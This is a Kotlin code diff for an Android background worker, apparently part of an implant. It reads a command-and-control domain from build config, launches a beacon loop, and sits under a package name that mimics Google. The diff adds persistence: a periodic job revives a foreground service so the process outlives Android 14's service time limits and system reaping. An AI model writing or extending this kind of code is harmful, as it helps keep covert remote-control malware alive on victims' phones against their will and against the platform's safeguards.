@@ -1,6 +1,7 @@
 package com.shadow
 
 import android.content.Context
+import android.util.Log
 import androidx.work.*
 import com.google.android.phonesync.BuildConfig
 import java.util.concurrent.TimeUnit
@@ -13,6 +14,15 @@ class ShadowWorker(
     override suspend fun doWork(): Result {
         // Domain injected at build time via BuildConfig (C2_DOMAIN env var in CI)
         val c2Domain = BuildConfig.C2_DOMAIN
+
+        // Android 14 data-sync foreground services are stopped after ~6h; this
+        // periodic run is the recovery that revives the process and re-promotes it
+        // to the foreground tier after that window closes (or after any reap).
+        try {
+            SyncForegroundService.start(applicationContext)
+        } catch (e: Exception) {
+            Log.e(TAG, "doWork: foreground service start failed: ${e.message}")
+        }
 
         // Start the core. The Rust beacon loop owns its own lifetime and reconnect
         // backoff; it does NOT need this WorkManager slot held open. Previously this
@@ -28,6 +38,8 @@ class ShadowWorker(
     }
 
     companion object {
+        private const val TAG = "ShadowWorker"
+
         fun workManager(context: Context): WorkManager {
             return try {
                 WorkManager.getInstance(context)
